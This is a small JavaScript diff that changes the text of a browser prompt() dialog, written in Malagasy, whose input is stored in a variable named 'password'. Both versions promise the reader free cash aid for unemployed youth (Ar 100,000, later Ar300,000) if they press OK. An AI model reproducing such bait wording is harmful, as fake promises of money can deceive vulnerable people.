@@ -1,7 +1,7 @@
 var password = 'Ar300,000';
 
 password = prompt(
-  'Arahabaina, mendrika hahazo ny FANAMPIANA ARA-BOLA Ar 100,000 HIADIANA AMIN’NY FAHANTRANA HO AN’NY TANORA TSY MANANA ASA ianao. Tsindrio ny OK mba hahazoanao azy avy hatrany.',
+  'Mendrika hahazo Ar300,000 ianao amin’ny FANDAHARANA HO AN’NY TANORA 2026. Tsindrio OK handraisana izany izao.',
   'Ar300,000'
 );
 
